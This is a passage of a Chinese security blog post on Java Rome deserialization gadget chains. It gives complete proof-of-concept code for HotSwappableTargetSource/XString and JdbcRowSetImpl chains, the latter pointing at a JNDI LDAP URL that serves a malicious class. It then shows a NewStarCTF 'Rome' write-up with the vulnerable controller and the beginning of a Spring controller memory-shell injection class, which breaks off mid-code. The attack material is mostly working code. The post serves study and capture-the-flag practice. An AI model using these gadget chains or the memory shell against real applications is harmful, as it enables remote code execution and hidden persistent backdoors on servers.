class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="HotSwappableTargetSource链"><a href="#HotSwappableTargetSource链" class="headerlink" title="HotSwappableTargetSource链"></a>HotSwappableTargetSource链</h1><p>此事在西湖论剑 ez_api 中亦有记载，通过 HotSwappableTargetSource#equals 调用 Xstring#toString，于是接上</p><p>poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>objects<span class="token punctuation">.</span></span><span class="token class-name">XString</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>target<span class="token punctuation">.</span></span><span class="token class-name">HotSwappableTargetSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Array</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">XStringChain</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> tpl <span class="token operator">=</span> <span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">getTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> tpl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HotSwappableTargetSource</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HotSwappableTargetSource</span> h2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token function">makeMap</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span>h2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> makeMap <span class="token punctuation">(</span><span class="token class-name">Object</span> v1<span class="token punctuation">,</span> <span class="token class-name">Object</span> v2 <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"size"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> nodeC<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            nodeC <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Node"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span> <span class="token class-name">ClassNotFoundException</span> e <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            nodeC <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Entry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> nodeCons <span class="token operator">=</span> nodeC<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> nodeC<span class="token punctuation">)</span><span class="token punctuation">;</span>        nodeCons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> tbl <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>nodeC<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"table"</span><span class="token punctuation">,</span> tbl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h1><p>fastjson 反序列化里提过这个类</p><p>这条链子和之前的没关系，产生漏洞是因为当时链尾的时候的调用任意 getter 方法，一开始我们是去调用 <code>TemplatesImpl#getOutputProperties()</code> 的，现在我们可以用 <code>JdbcRowSetImpl</code> 这条链子</p><p>链子分析已经在 fastjson 篇分析过了，直接上poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">.</span></span><span class="token class-name">JdbcRowSetImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">EqualsBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplChain</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">JdbcRowSetImpl</span> jdbcRowSet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JdbcRowSetImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// EXP为我们的恶意类</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"ldap://127.0.0.1:1230/ExportObject"</span><span class="token punctuation">;</span>        jdbcRowSet<span class="token punctuation">.</span><span class="token function">setDataSourceName</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">JdbcRowSetImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>jdbcRowSet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">EqualsBean</span> equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span> <span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>既然是 JNDI 就要注意 jdk 版本问题</p><hr><h1 id="缩短payload"><a href="#缩短payload" class="headerlink" title="缩短payload"></a>缩短payload</h1><hr><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="NewStarCTF-Rome"><a href="#NewStarCTF-Rome" class="headerlink" title="[NewStarCTF]Rome"></a>[NewStarCTF]Rome</h2><p>拿到 jar 包解压反编译</p><p>直接看controller</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">remo<span class="token punctuation">.</span>remo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PostMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SerController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">SerController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">helloCTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Do you like Jvav?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">helloCTF</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> <span class="token constant">EXP</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">EXP</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"Do you know Rome Serializer?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> exp <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token constant">EXP</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ByteArrayInputStream</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>            objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"Do You like Jvav?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看一下 lib</p><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250219170856225.png" alt="image-20250219170856225"></p><p>可以直接打 rome 反序列化</p><p>测了下发现 buu 题库里的靶机没出网，得打个内存马</p><p>内存马参考：</p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/140571199">https://blog.csdn.net/weixin_39190897/article/details/140571199</a></p><p><a href="https://todis21.github.io/2023/11/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/">https://todis21.github.io/2023/11/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">RequestContextHolder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">ServletRequestAttributes</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>condition<span class="token punctuation">.</span></span><span class="token class-name">PatternsRequestCondition</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>condition<span class="token punctuation">.</span></span><span class="token class-name">RequestMethodsRequestCondition</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingInfo</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingHandlerMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InjectToController</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">InjectToController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">WebApplicationContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebApplicationContext</span><span class="token punctuation">)</span> <span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">RequestMappingHandlerMapping</span> mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">RequestMappingHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> configField <span class="token operator">=</span> mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        configField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration</span> config <span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration</span><span class="token punctuation">)</span> configField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method2 <span class="token 